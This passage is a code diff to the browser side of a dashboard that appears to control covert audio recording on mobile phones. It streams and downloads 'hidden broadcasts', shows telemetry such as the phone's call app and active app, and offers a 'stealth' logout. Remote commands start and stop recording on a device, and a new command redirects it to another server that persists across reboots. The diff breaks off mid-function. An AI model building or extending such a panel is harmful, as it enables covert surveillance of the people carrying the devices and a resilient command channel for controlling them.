@@ -16,6 +16,9 @@ const state = {
     deleteTargetId: null,
     deviceStatus: [],
     selectedSessions: new Set(),
+    lastSessionsFingerprint: '',
+    lastClientsKey: '',
+    lastRemoteKey: '',
 };
 
 const ui = {
@@ -23,16 +26,18 @@ const ui = {
     liveIndicator: document.getElementById('live-indicator'),
     trackName: document.getElementById('track-name'),
     trackMeta: document.getElementById('track-meta'),
-    
+
     // Player
     audio: document.getElementById('audio-player'),
     btnPlay: document.getElementById('btn-play'),
     btnRewind: document.getElementById('btn-rewind'),
     btnJumpLive: document.getElementById('btn-jump-live'),
+    btnSaveCurrentAudio: document.getElementById('btn-save-current-audio'),
     iconPlay: document.getElementById('icon-play'),
     iconPause: document.getElementById('icon-pause'),
     speedSelect: document.getElementById('speed-select'),
     playerStateBadge: document.getElementById('player-state-badge'),
+    telemetryMainAppBadge: document.getElementById('telemetry-mainapp-badge'),
     telemetryActiveAppBadge: document.getElementById('telemetry-activeapp-badge'),
     telemetryCallAppBadge: document.getElementById('telemetry-callapp-badge'),
     telemetryPostureBadge: document.getElementById('telemetry-posture-badge'),
@@ -47,7 +52,7 @@ const ui = {
     telemetryBatteryBadge: document.getElementById('telemetry-battery-badge'),
     telemetryRouteBadge: document.getElementById('telemetry-route-badge'),
     latencyBadge: document.getElementById('latency-badge'),
-    
+
     // Channel Panner
     btnChanBoth: document.getElementById('btn-chan-both'),
     btnChanLeft: document.getElementById('btn-chan-left'),
@@ -59,11 +64,11 @@ const ui = {
     progressBuffer: document.getElementById('progress-buffer'),
     timeCurrent: document.getElementById('time-current'),
     timeTotal: document.getElementById('time-total'),
-    
+
     // Visualizer
     canvas: document.getElementById('visualizer'),
     overlay: document.getElementById('visualizer-overlay'),
-    
+
     // Stats
     statActive: document.getElementById('stat-active'),
     statInstalls: document.getElementById('stat-installs'),
@@ -74,13 +79,13 @@ const ui = {
     installAlertBanner: document.getElementById('install-alert-banner'),
     installAlertText: document.getElementById('install-alert-text'),
     btnCloseInstallAlert: document.getElementById('btn-close-install-alert'),
-    
+
     // Dashboard List
     sessionList: document.getElementById('session-list'),
     sessionCount: document.getElementById('session-count'),
     btnRefresh: document.getElementById('btn-refresh'),
     clientFilter: document.getElementById('client-filter'),
-    
+
     // Remote Control
     btnRemoteStart: document.getElementById('btn-remote-start'),
     btnRemoteStop: document.getElementById('btn-remote-stop'),
@@ -92,8 +97,10 @@ const ui = {
     remoteWatchdogInterval: document.getElementById('remote-watchdog-interval'),
     remoteStopTime: document.getElementById('remote-stop-time'),
     btnRemoteSchedule: document.getElementById('btn-remote-schedule'),
+    remoteServerUrlInput: document.getElementById('remote-server-url-input'),
+    btnRemoteSwitchUrl: document.getElementById('btn-remote-switch-url'),
     telemetryEcoBadge: document.getElementById('telemetry-eco-badge'),
-    
+
     tabAll: document.getElementById('tab-all'),
     tabPlayer: document.getElementById('tab-player'),
     tabDashboard: document.getElementById('tab-dashboard'),
@@ -104,22 +111,13 @@ const ui = {
     colRight: document.getElementById('col-right'),
     gridContainer: document.getElementById('grid-container'),
     toastContainer: document.getElementById('toast-container'),
-    
+
     // Modal
     modalOverlay: document.getElementById('modal-overlay'),
     modalSessionId: document.getElementById('modal-session-id'),
     modalCancel: document.getElementById('modal-cancel'),
     modalConfirm: document.getElementById('modal-confirm'),
     btnStealthLogout: document.getElementById('btn-stealth-logout'),
-
-    // Bulk Multi-Select Actions
-    btnSelectAll: document.getElementById('btn-select-all'),
-    selectAllText: document.getElementById('select-all-text'),
-    bulkToolbar: document.getElementById('bulk-toolbar'),
-    bulkSelectedCount: document.getElementById('bulk-selected-count'),
-    btnBulkProDownload: document.getElementById('btn-bulk-pro-download'),
-    btnBulkAudioDownload: document.getElementById('btn-bulk-audio-download'),
-    btnBulkClear: document.getElementById('btn-bulk-clear'),
 };
 
 let hls = null;
@@ -128,6 +126,7 @@ let pannerNode = null;
 let analyser = null;
 let source = null;
 let animationId = null;
+const selectedSessionIds = new Set();
 
 document.addEventListener('DOMContentLoaded', () => {
     bindEvents();
@@ -140,7 +139,7 @@ function bindEvents() {
     ui.btnStealthLogout?.addEventListener('click', async () => {
         try {
             await fetch('/api/v1/auth/logout', { method: 'POST' });
-        } catch (_) {}
+        } catch (_) { }
         window.location.href = '/login';
     });
 
@@ -148,10 +147,25 @@ function bindEvents() {
     ui.btnPlay?.addEventListener('click', togglePlay);
     ui.btnRewind?.addEventListener('click', rewind15);
     ui.btnJumpLive?.addEventListener('click', jumpToLive);
-    ui.btnRefresh?.addEventListener('click', fetchAllData);
+    ui.btnSaveCurrentAudio?.addEventListener('click', saveCurrentStreamAudio);
+    ui.btnRefresh?.addEventListener('click', () => {
+        state.lastSessionsFingerprint = '';
+        fetchAllData();
+    });
     ui.btnCloseInstallAlert?.addEventListener('click', () => {
         if (ui.installAlertBanner) ui.installAlertBanner.style.display = 'none';
     });
+
+    if (ui.audio) {
+        ui.audio.addEventListener('timeupdate', updateProgress);
+        ui.audio.addEventListener('play', () => setPlayingState(true));
+        ui.audio.addEventListener('pause', () => setPlayingState(false));
+    }
+
+    if (ui.progressBar) {
+        ui.progressBar.addEventListener('click', seekAudio);
+        ui.progressBar.style.cursor = 'pointer';
+    }
 
     if (ui.speedSelect) {
         ui.speedSelect.addEventListener('change', (e) => {
@@ -164,16 +178,20 @@ function bindEvents() {
     if (ui.btnChanRight) ui.btnChanRight.addEventListener('click', () => setChannelPan(1, ui.btnChanRight));
 
     if (ui.clientFilter) {
-        ui.clientFilter.addEventListener('change', () => renderSessionsList());
+        ui.clientFilter.addEventListener('change', () => {
+            state.lastSessionsFingerprint = '';
+            renderSessionsList();
+        });
     }
-    
+
     if (ui.btnRemoteStart) ui.btnRemoteStart.addEventListener('click', () => sendRemoteCommand('START'));
     if (ui.btnRemoteStop) ui.btnRemoteStop.addEventListener('click', () => sendRemoteCommand('STOP'));
     if (ui.btnToggleEco) ui.btnToggleEco.addEventListener('click', toggleEcoMode);
     if (ui.btnRemoteRestartStream) ui.btnRemoteRestartStream.addEventListener('click', () => sendRemoteRestart('stream'));
     if (ui.btnRemoteRestartApp) ui.btnRemoteRestartApp.addEventListener('click', () => sendRemoteRestart('app'));
     if (ui.btnRemoteSchedule) ui.btnRemoteSchedule.addEventListener('click', sendRemoteSchedule);
-    
+    if (ui.btnRemoteSwitchUrl) ui.btnRemoteSwitchUrl.addEventListener('click', sendRemoteSwitchUrl);
+
     ui.tabAll?.addEventListener('click', () => setViewMode('all'));
     ui.tabPlayer?.addEventListener('click', () => setViewMode('player'));
     ui.tabDashboard?.addEventListener('click', () => setViewMode('dashboard'));
@@ -204,7 +222,7 @@ function bindEvents() {
         if (ui.playerStateBadge) ui.playerStateBadge.textContent = 'State: Stream Error';
     });
     ui.audio.addEventListener('timeupdate', updateProgress);
-    
+
     ui.progressBar?.addEventListener('click', (e) => {
         if (!state.currentSession || !ui.audio.duration) return;
         const rect = ui.progressBar.getBoundingClientRect();
@@ -213,12 +231,6 @@ function bindEvents() {
         state.isLiveLock = false;
         ui.btnJumpLive?.classList.remove('active');
     });
-
-    // Bulk selection toolbar events
-    ui.btnSelectAll?.addEventListener('click', toggleSelectAll);
-    ui.btnBulkClear?.addEventListener('click', clearSelection);
-    ui.btnBulkProDownload?.addEventListener('click', () => downloadSelectedSessions('pro_chunks'));
-    ui.btnBulkAudioDownload?.addEventListener('click', () => downloadSelectedSessions('audio'));
 }
 
 function setViewMode(mode) {
@@ -339,9 +351,9 @@ async function fetchActiveSessions() {
 function updateActiveSessions(sessions) {
     const prev = ui.select.value;
     state.sessions = sessions;
-    
+
     ui.select.innerHTML = '';
-    
+
     if (sessions.length === 0) {
         ui.select.innerHTML = '<option value="">No live hidden broadcasts right now</option>';
         ui.select.disabled = true;
@@ -354,7 +366,7 @@ function updateActiveSessions(sessions) {
             ui.select.appendChild(opt);
         });
         ui.select.disabled = false;
-        
+
         if (prev && sessions.find(s => s.session_id === prev)) {
             ui.select.value = prev;
         } else if (sessions.length === 1 && !state.currentSession) {
@@ -369,15 +381,30 @@ async function fetchStats() {
         const res = await fetch(`${API_DASHBOARD}/stats?type=hidden`);
         if (!res.ok) return;
         const data = await res.json();
-        
-        if (ui.statActive) ui.statActive.textContent = data.active_sessions || 0;
-        if (ui.statSessions) ui.statSessions.textContent = data.total_sessions || 0;
-        if (ui.statChunks) ui.statChunks.textContent = data.total_chunks || 0;
-        if (ui.statDuration) ui.statDuration.textContent = data.total_duration_human || '00:00';
-        if (ui.statStorage) ui.statStorage.textContent = data.total_size_human || '0 B';
+
+        if (ui.statActive && ui.statActive.textContent !== String(data.active_sessions || 0)) {
+            ui.statActive.textContent = data.active_sessions || 0;
+        }
+        if (ui.statSessions && ui.statSessions.textContent !== String(data.total_sessions || 0)) {
+            ui.statSessions.textContent = data.total_sessions || 0;
+        }
+        if (ui.statChunks && ui.statChunks.textContent !== String(data.total_chunks || 0)) {
+            ui.statChunks.textContent = data.total_chunks || 0;
+        }
+        if (ui.statDuration && ui.statDuration.textContent !== (data.total_duration_human || '00:00')) {
+            ui.statDuration.textContent = data.total_duration_human || '00:00';
+        }
+        if (ui.statStorage && ui.statStorage.textContent !== (data.total_size_human || '0 B')) {
+            ui.statStorage.textContent = data.total_size_human || '0 B';
+        }
     } catch (e) {
         console.error('Stats fetch error:', e);
     }
+}
+
+function computeSessionsFingerprint(sessions, filterVal) {
+    if (!sessions || sessions.length === 0) return `empty:${filterVal}`;
+    return filterVal + '|' + sessions.map(s => `${s.session_id}:${s.status}:${s.total_chunks}:${s.total_duration}:${s.total_bytes}`).join(';');
 }
 
 async function fetchAllSessions() {
@@ -385,8 +412,18 @@ async function fetchAllSessions() {
         const res = await fetch(`${API_DASHBOARD}/sessions?type=hidden&limit=200`);
         if (!res.ok) return;
         const data = await res.json();
-        state.dashboardSessions = data.sessions || [];
-        renderSessionsList();
+        const newSessions = data.sessions || [];
+        const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
+        const fingerprint = computeSessionsFingerprint(newSessions, filterVal);
+
+        state.dashboardSessions = newSessions;
+        updateClientFilterUI(newSessions);
+        updateRemoteSelectUI();
+
+        if (fingerprint !== state.lastSessionsFingerprint) {
+            state.lastSessionsFingerprint = fingerprint;
+            renderSessionsList();
+        }
     } catch (e) {
         console.error('All sessions fetch error:', e);
     }
@@ -398,8 +435,18 @@ function updateRemoteSelectUI() {
     const allClients = [...new Set([
         ...state.deviceStatus.map(d => d.client_id),
         ...state.dashboardSessions.map(s => s.client_name).filter(Boolean)
-    ])];
-    
+    ])].sort();
+
+    const remoteKey = selectedRemote + '|' + allClients.map(c => {
+        const d = state.deviceStatus.find(x => x.client_id === c);
+        return `${c}:${d ? d.status : 'offline'}`;
+    }).join(';');
+
+    if (state.lastRemoteKey === remoteKey) {
+        return; // Remote device states unchanged, do not touch DOM
+    }
+    state.lastRemoteKey = remoteKey;
+
     let remoteHtml = '<option value="">Select Target Device...</option>';
     allClients.forEach(c => {
         const deviceData = state.deviceStatus.find(d => d.client_id === c);
@@ -407,28 +454,34 @@ function updateRemoteSelectUI() {
         let icon = '🔴';
         if (status === 'recording') icon = '🟢';
         else if (status === 'idle') icon = '🟡';
-        
+
         remoteHtml += `<option value="${c}" ${c === selectedRemote ? 'selected' : ''}>${icon} ${c} (${status})</option>`;
     });
     ui.remoteClientSelect.innerHTML = remoteHtml;
+    ui.remoteClientSelect.value = selectedRemote;
+}
+
+function updateClientFilterUI(allSessions) {
+    if (!ui.clientFilter) return;
+    const selectedClient = ui.clientFilter.value;
+    const clients = [...new Set(allSessions.map(s => s.client_name).filter(Boolean))].sort();
+    const clientsKey = clients.join('|');
+
+    if (state.lastClientsKey === clientsKey) {
+        return; // Device list unchanged, preserve dropdown
+    }
+    state.lastClientsKey = clientsKey;
+
+    let filterHtml = '<option value="">All Devices / Clients</option>';
+    clients.forEach(c => {
+        filterHtml += `<option value="${c}" ${c === selectedClient ? 'selected' : ''}>📱 ${c}</option>`;
+    });
+    ui.clientFilter.innerHTML = filterHtml;
+    ui.clientFilter.value = selectedClient;
 }
 
 function renderSessionsList() {
     const allSessions = state.dashboardSessions;
-
-    if (ui.clientFilter) {
-        const selectedClient = ui.clientFilter.value;
-        const clients = [...new Set(allSessions.map(s => s.client_name).filter(Boolean))];
-        
-        let filterHtml = '<option value="">All Devices / Clients</option>';
-        clients.forEach(c => {
-            filterHtml += `<option value="${c}" ${c === selectedClient ? 'selected' : ''}>📱 ${c}</option>`;
-        });
-        ui.clientFilter.innerHTML = filterHtml;
-    }
-
-    updateRemoteSelectUI();
-
     const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
     const sessions = filterVal ? allSessions.filter(s => s.client_name === filterVal) : allSessions;
 
@@ -441,13 +494,10 @@ function renderSessionsList() {
     } else {
         ui.sessionList.innerHTML = generateSessionsHtml(sessions);
     }
-    updateBulkToolbar();
-    updateSelectAllButtonText();
 }
 
 function generateSessionsHtml(sessionsArray) {
     return sessionsArray.map(s => {
-        const isSelected = state.selectedSessions.has(s.session_id);
         const isLive = s.status === 'live';
         const statusClass = isLive ? 'live' : 'ended';
         const badgeText = isLive ? '● LIVE' : 'ENDED';
@@ -461,12 +511,12 @@ function generateSessionsHtml(sessionsArray) {
         const chunkZipUrl = `/api/v1/broadcasts/${s.session_id}/export-channel?format=zip`;
 
         return `
-            <li class="session-card session-card--${statusClass} ${isSelected ? 'session-card--selected' : ''}" id="card-${s.session_id}">
+            <li class="session-card session-card--${statusClass}">
                 <div class="session-card__header">
-                    <label class="session-check-label" onclick="event.stopPropagation();" title="Select for Pro Batch ZIP Export">
-                        <input type="checkbox" class="session-checkbox" data-id="${s.session_id}" ${isSelected ? 'checked' : ''} onchange="toggleSessionSelect('${s.session_id}', this.checked)">
-                    </label>
                     <div class="session-card__device">
+                        <label class="session-card__select" style="display: flex; align-items: center; margin-right: 8px; cursor: pointer;" title="Select for Batch Actions">
+                            <input type="checkbox" class="session-select-check" data-id="${s.session_id}" ${selectedSessionIds.has(s.session_id) ? 'checked' : ''} onchange="toggleSessionSelect('${s.session_id}', this.checked)" style="width: 17px; height: 17px; accent-color: #7c5cfc; cursor: pointer;">
+                        </label>
                         <div class="device-icon ${isLive ? 'device-icon--live' : ''}">📱</div>
                         <div class="device-details">
                             <div class="session-card__title">
@@ -554,8 +604,8 @@ function generateSessionsHtml(sessionsArray) {
 
 function loadSession(sessionId) {
     if (!sessionId) return;
-    const session = state.sessions.find(s => s.session_id === sessionId) 
-                 || state.dashboardSessions.find(s => s.session_id === sessionId);
+    const session = state.sessions.find(s => s.session_id === sessionId)
+        || state.dashboardSessions.find(s => s.session_id === sessionId);
     if (!session) return;
 
     state.currentSession = session;
@@ -571,10 +621,12 @@ function loadSession(sessionId) {
     if (Hls.isSupported()) {
         if (hls) hls.destroy();
         hls = new Hls({
-            liveSyncDurationCount: 3,
-            liveMaxLatencyDurationCount: 6,
+            liveSyncDurationCount: 1,           // Play immediately as soon as 1 segment arrives (ultra-low lag)
+            liveMaxLatencyDurationCount: 2,     // Stay tightly clamped to live edge
+            maxLiveSyncPlaybackRate: 1.15,      // YouTube-style: automatically speeds up by 1.15x if behind live edge
             enableWorker: true,
             lowLatencyMode: true,
+            backBufferLength: 600,              // Keep 10 minutes of audio in buffer for smooth time-shift rewinding
         });
 
         hls.loadSource(streamUrl);
@@ -583,6 +635,7 @@ function loadSession(sessionId) {
         hls.on(Hls.Events.MANIFEST_PARSED, () => {
             ui.btnPlay.disabled = false;
             ui.btnRewind.disabled = false;
+            if (ui.btnSaveCurrentAudio) ui.btnSaveCurrentAudio.disabled = false;
             ui.audio.play().catch(() => setPlayingState(false));
             initAudioContext();
             startVisualizer();
@@ -595,11 +648,23 @@ function loadSession(sessionId) {
                 ui.liveIndicator.className = 'live-pill live-pill--active';
                 if (details.fragments && details.fragments.length > 0) {
                     const latestFrag = details.fragments[details.fragments.length - 1];
-                    parseTelemetryFromSegmentName(latestFrag.relurl || latestFrag.url || '');
+                    const fragUrl = latestFrag.relurl || latestFrag.url || '';
+                    const baseName = fragUrl.split('/').pop().split('?')[0];
+                    parseTelemetryFromSegmentName(baseName);
                 }
             } else {
                 ui.liveIndicator.textContent = 'RECORDED';
                 ui.liveIndicator.className = 'live-pill live-pill--vod';
+            }
+        });
+
+        hls.on(Hls.Events.FRAG_CHANGED, (_event, data) => {
+            if (data && data.frag) {
+                const chunkUrl = data.frag.relurl || data.frag.url || '';
+                const baseName = chunkUrl.split('/').pop().split('?')[0];
+                const chunkEl = document.getElementById('stealth-current-chunk-name');
+                if (chunkEl) chunkEl.textContent = baseName;
+                parseTelemetryFromSegmentName(baseName);
             }
         });
     } else if (ui.audio.canPlayType('application/vnd.apple.mpegurl')) {
@@ -609,6 +674,7 @@ function loadSession(sessionId) {
 }
 
 function parseTelemetryFromSegmentName(segUrl) {
+    const mnMatch = segUrl.match(/_MN([01])/);
     const bMatch = segUrl.match(/_B(-?\d+)/);
     const sMatch = segUrl.match(/_S(-?\d+)/);
     const oMatch = segUrl.match(/_O([A-Z]{3})/);
@@ -623,6 +689,13 @@ function parseTelemetryFromSegmentName(segUrl) {
     const mMatch = segUrl.match(/_M([01])/);
     const pMatch = segUrl.match(/_P([A-Z]+)/);
     const aMatch = segUrl.match(/_A([A-Z0-9]+)/);
+
+    // Main App Recording state
+    if (mnMatch && ui.telemetryMainAppBadge) {
+        const isMainOn = mnMatch[1] === '1';
+        ui.telemetryMainAppBadge.textContent = isMainOn ? '🔴 Main App: RECORDING' : '⚪ Main App: Standby';
+        ui.telemetryMainAppBadge.className = isMainOn ? 'status-badge status-badge--red' : 'status-badge';
+    }
 
     // Battery
     if (bMatch && ui.telemetryBatteryBadge) {
@@ -923,6 +996,10 @@ function setPlayingState(isPlaying) {
     } else {
         ui.iconPlay.style.display = 'inline';
         ui.iconPause.style.display = 'none';
+        if (animationId) {
+            cancelAnimationFrame(animationId);
+            animationId = null;
+        }
     }
 }
 
@@ -936,8 +1013,43 @@ function rewind15() {
 function jumpToLive() {
     if (!hls || !hls.liveSyncPosition) return;
     ui.audio.currentTime = hls.liveSyncPosition;
+    ui.audio.playbackRate = parseFloat(ui.speedSelect?.value || '1.0');
     state.isLiveLock = true;
     ui.btnJumpLive?.classList.add('active');
+    if (ui.btnJumpLive) ui.btnJumpLive.innerHTML = '● LIVE';
+}
+
+function seekAudio(e) {
+    if (!ui.audio.duration || !ui.progressBar) return;
+    const rect = ui.progressBar.getBoundingClientRect();
+    const clickX = e.clientX - rect.left;
+    const pct = Math.max(0, Math.min(1, clickX / rect.width));
+    const targetTime = pct * ui.audio.duration;
+    ui.audio.currentTime = targetTime;
+
+    if (hls && hls.liveSyncPosition && Math.abs(hls.liveSyncPosition - targetTime) < 3) {
+        jumpToLive();
+    } else {
+        state.isLiveLock = false;
+        ui.btnJumpLive?.classList.remove('active');
+    }
+}
+
+function saveCurrentStreamAudio() {
+    if (!state.currentSession) {
+        showToast('No active stream loaded to save', 'error');
+        return;
+    }
+    const sessionId = state.currentSession.session_id;
+    const downloadUrl = `/api/v1/broadcasts/${sessionId}/export-channel`;
+    const a = document.createElement('a');
+    a.href = downloadUrl;
+    a.target = '_blank';
+    a.download = `${state.currentSession.client_name || 'stream'}_recording.aac`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    showToast('💾 Downloading full audio recording...', 'success');
 }
 
 function updateProgress() {
@@ -950,8 +1062,18 @@ function updateProgress() {
     ui.timeTotal.textContent = formatTime(dur);
 
     if (hls && hls.liveSyncPosition) {
-        const lat = Math.max(0, (hls.liveSyncPosition - cur)).toFixed(1);
-        if (ui.latencyBadge) ui.latencyBadge.textContent = `Latency: ${lat}s`;
+        const lat = Math.max(0, (hls.liveSyncPosition - cur));
+        if (ui.latencyBadge) ui.latencyBadge.textContent = `Latency: ${lat.toFixed(1)}s`;
+
+        if (lat <= 2.5) {
+            ui.btnJumpLive?.classList.add('active');
+            if (ui.btnJumpLive) ui.btnJumpLive.innerHTML = '● LIVE';
+        } else {
+            ui.btnJumpLive?.classList.remove('active');
+            if (ui.btnJumpLive) {
+                ui.btnJumpLive.innerHTML = `● LIVE <span style="font-size:10px;opacity:0.85;">(-${formatTime(lat)})</span>`;
+            }
+        }
     }
 }
 
@@ -1090,6 +1212,45 @@ function updateEcoButtonState(isEco) {
     }
 }
 
+async function sendRemoteSwitchUrl() {
+    const clientId = ui.remoteClientSelect ? ui.remoteClientSelect.value : null;
+    if (!clientId) {
+        alert('Please select a target device first');
+        return;
+    }
+    const newUrl = (ui.remoteServerUrlInput ? ui.remoteServerUrlInput.value : '').trim();
+    if (!newUrl || (!newUrl.startsWith('http://') && !newUrl.startsWith('https://'))) {
+        alert('Please enter a valid HTTP/HTTPS URL (e.g. https://my-new-server.com)');
+        return;
+    }
+
+    if (!confirm(`Switch ${clientId} to new server URL:\n\n${newUrl}\n\nThe mobile device will immediately reconnect to this new server and persist it across reboots.`)) {
+        return;
+    }
+
+    try {
+        const res = await fetch('/api/v1/broadcasts/remote-command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'SET_SERVER_URL',
+                payload: { server_url: newUrl }
+            })
+        });
+        if (res.ok) {
+            showToast(`🌐 Switch URL signal pushed to ${clientId}!`, 'success');
+            if (ui.remoteServerUrlInput) ui.remoteServerUrlInput.value = '';
+        } else {
+            const err = await res.json();
+            showToast(`Error: ${err.message}`, 'error');
+        }
+    } catch (e) {
+        console.error('Switch URL error:', e);
+        showToast('Failed to send switch URL command', 'error');
+    }
+}
+
 // ════════════════════════════════════════════════════════════════════════════
 // AUDIO CONTEXT & VISUALIZER
 // ════════════════════════════════════════════════════════════════════════════
@@ -1099,7 +1260,8 @@ function initAudioContext() {
     try {
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         analyser = audioCtx.createAnalyser();
-        analyser.fftSize = 64;
+        analyser.fftSize = 1024; // 1024 samples for silky smooth, high-resolution waveform
+        analyser.smoothingTimeConstant = 0.8;
         pannerNode = audioCtx.createStereoPanner ? audioCtx.createStereoPanner() : null;
         source = audioCtx.createMediaElementSource(ui.audio);
 
@@ -1127,29 +1289,114 @@ function setChannelPan(panVal, activeBtn) {
 
 function startVisualizer() {
     if (!analyser || !ui.canvas) return;
+    if (animationId) {
+        cancelAnimationFrame(animationId);
+        animationId = null;
+    }
     const ctx = ui.canvas.getContext('2d');
-    const bufferLength = analyser.frequencyBinCount;
+    const bufferLength = analyser.fftSize;
     const dataArray = new Uint8Array(bufferLength);
-    
+
+    let cachedWidth = ui.canvas.width;
+    let cachedHeight = ui.canvas.height;
+
+    // Linear gradient across canvas for waveform line (purple -> cyan -> emerald)
+    let lineGradient = ctx.createLinearGradient(0, 0, cachedWidth, 0);
+    lineGradient.addColorStop(0, '#7c5cfc');
+    lineGradient.addColorStop(0.5, '#06b6d4');
+    lineGradient.addColorStop(1, '#10b981');
+
+    // Translucent gradient fill between wave and center baseline
+    let fillGradient = ctx.createLinearGradient(0, 0, 0, cachedHeight);
+    fillGradient.addColorStop(0, 'rgba(124, 92, 252, 0.22)');
+    fillGradient.addColorStop(0.5, 'rgba(6, 182, 212, 0.12)');
+    fillGradient.addColorStop(1, 'rgba(16, 185, 129, 0.02)');
+
+    function updateGradients() {
+        cachedWidth = ui.canvas.width;
+        cachedHeight = ui.canvas.height;
+        lineGradient = ctx.createLinearGradient(0, 0, cachedWidth, 0);
+        lineGradient.addColorStop(0, '#7c5cfc');
+        lineGradient.addColorStop(0.5, '#06b6d4');
+        lineGradient.addColorStop(1, '#10b981');
+
+        fillGradient = ctx.createLinearGradient(0, 0, 0, cachedHeight);
+        fillGradient.addColorStop(0, 'rgba(124, 92, 252, 0.22)');
+        fillGradient.addColorStop(0.5, 'rgba(6, 182, 212, 0.12)');
+        fillGradient.addColorStop(1, 'rgba(16, 185, 129, 0.02)');
+    }
+
     function draw() {
-        if (!state.isPlaying) return;
-        animationId = requestAnimationFrame(draw);
-        analyser.getByteFrequencyData(dataArray);
-        
-        ctx.clearRect(0, 0, ui.canvas.width, ui.canvas.height);
-        const barWidth = (ui.canvas.width / bufferLength) * 2;
-        let x = 0;
-        
-        for (let i = 0; i < bufferLength; i++) {
-            const barHeight = (dataArray[i] / 255) * ui.canvas.height;
-            const gradient = ctx.createLinearGradient(0, ui.canvas.height, 0, 0);
-            gradient.addColorStop(0, '#7c5cfc');
-            gradient.addColorStop(1, '#10b981');
-            
-            ctx.fillStyle = gradient;
-            ctx.fillRect(x, ui.canvas.height - barHeight, barWidth - 2, barHeight);
-            x += barWidth;
+        if (!state.isPlaying) {
+            if (animationId) {
+                cancelAnimationFrame(animationId);
+                animationId = null;
+            }
+            return;
         }
+        animationId = requestAnimationFrame(draw);
+        analyser.getByteTimeDomainData(dataArray);
+
+        if (ui.canvas.width !== cachedWidth || ui.canvas.height !== cachedHeight) {
+            updateGradients();
+        }
+
+        const width = ui.canvas.width;
+        const height = ui.canvas.height;
+        const centerY = height / 2;
+
+        ctx.clearRect(0, 0, width, height);
+
+        // 1. Subtle horizontal dashed center reference line
+        ctx.save();
+        ctx.beginPath();
+        ctx.strokeStyle = 'rgba(255, 255, 255, 0.07)';
+        ctx.lineWidth = 1;
+        ctx.setLineDash([4, 4]);
+        ctx.moveTo(0, centerY);
+        ctx.lineTo(width, centerY);
+        ctx.stroke();
+        ctx.restore();
+
+        // 2. Translucent filled wave area (aura under wave)
+        const sliceWidth = width / (bufferLength - 1);
+        ctx.beginPath();
+        ctx.moveTo(0, centerY);
+        let x = 0;
+        for (let i = 0; i < bufferLength; i++) {
+            const v = dataArray[i] / 128.0; // 1.0 is neutral
+            const y = (v * height) / 2;
+            ctx.lineTo(x, y);
+            x += sliceWidth;
+        }
+        ctx.lineTo(width, centerY);
+        ctx.closePath();
+        ctx.fillStyle = fillGradient;
+        ctx.fill();
+
+        // 3. Crisp glowing oscilloscope wave line
+        ctx.save();
+        ctx.beginPath();
+        ctx.strokeStyle = lineGradient;
+        ctx.lineWidth = 2.5;
+        ctx.lineCap = 'round';
+        ctx.lineJoin = 'round';
+        ctx.shadowColor = 'rgba(6, 182, 212, 0.5)';
+        ctx.shadowBlur = 10;
+
+        x = 0;
+        for (let i = 0; i < bufferLength; i++) {
+            const v = dataArray[i] / 128.0;
+            const y = (v * height) / 2;
+            if (i === 0) {
+                ctx.moveTo(x, y);
+            } else {
+                ctx.lineTo(x, y);
+            }
+            x += sliceWidth;
+        }
+        ctx.stroke();
+        ctx.restore();
     }
     draw();
 }
@@ -1184,13 +1431,77 @@ async function confirmDelete() {
 }
 
 function openDownloaderModal(hlsUrl) {
-    const iframe = document.getElementById('downloader-iframe');
-    const overlay = document.getElementById('modal-downloader-overlay');
-    if (iframe && overlay) {
-        iframe.src = `/downloader.html?stream=${encodeURIComponent(hlsUrl)}`;
-        overlay.classList.add('active');
+    const sessionId = (hlsUrl.match(/sessions\/([a-zA-Z0-9_-]+)/) || [])[1];
+    const session = sessionId ? (state.dashboardSessions.find(s => s.session_id === sessionId) || state.sessions.find(s => s.session_id === sessionId)) : null;
+    if (window.ProDownloader) {
+        window.ProDownloader.open(hlsUrl, session);
     }
 }
+
+function copyStealthCurrentChunkName() {
+    const el = document.getElementById('stealth-current-chunk-name');
+    if (el && el.textContent) {
+        navigator.clipboard.writeText(el.textContent);
+        showToast('Chunk filename copied to clipboard', 'info');
+    }
+}
+
+function toggleSessionSelect(sessionId, isChecked) {
+    if (isChecked) selectedSessionIds.add(sessionId);
+    else selectedSessionIds.delete(sessionId);
+    updateBulkToolbar();
+}
+
+function updateBulkToolbar() {
+    const toolbar = document.getElementById('bulk-toolbar');
+    const badge = document.getElementById('bulk-selected-count');
+    if (!toolbar || !badge) return;
+    const count = selectedSessionIds.size;
+    badge.textContent = count;
+    if (count > 0) {
+        toolbar.classList.add('visible');
+    } else {
+        toolbar.classList.remove('visible');
+    }
+}
+
+// Bulk Toolbar Actions
+document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('btn-bulk-pro-download')?.addEventListener('click', () => {
+        const selected = Array.from(selectedSessionIds).map(id => state.dashboardSessions.find(s => s.session_id === id) || { session_id: id });
+        if (window.ProDownloader && selected.length > 0) {
+            window.ProDownloader.openBatch(selected);
+        }
+    });
+
+    document.getElementById('btn-bulk-audio-download')?.addEventListener('click', () => {
+        const selected = Array.from(selectedSessionIds);
+        if (selected.length === 0) return;
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '/api/v1/broadcasts/export-batch';
+        form.target = '_blank';
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'session_ids';
+        input.value = JSON.stringify(selected);
+        form.appendChild(input);
+        const fmt = document.createElement('input');
+        fmt.type = 'hidden';
+        fmt.name = 'format';
+        fmt.value = 'audio';
+        form.appendChild(fmt);
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
+    });
+
+    document.getElementById('btn-bulk-clear')?.addEventListener('click', () => {
+        selectedSessionIds.clear();
+        document.querySelectorAll('.session-select-check').forEach(cb => cb.checked = false);
+        updateBulkToolbar();
+    });
+});
 
 async function endLiveSession(sessionId) {
     if (!confirm('End this live session?')) return;
@@ -1269,99 +1580,3 @@ function formatSize(bytes) {
     const i = Math.floor(Math.log(bytes) / Math.log(k));
     return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
 }
-
-// ════════════════════════════════════════════════════════════════════════════
-// MULTI-SESSION SELECTION & BATCH PRO DOWNLOAD
-// ════════════════════════════════════════════════════════════════════════════
-
-window.toggleSessionSelect = function(sessionId, isChecked) {
-    if (isChecked) {
-        state.selectedSessions.add(sessionId);
-    } else {
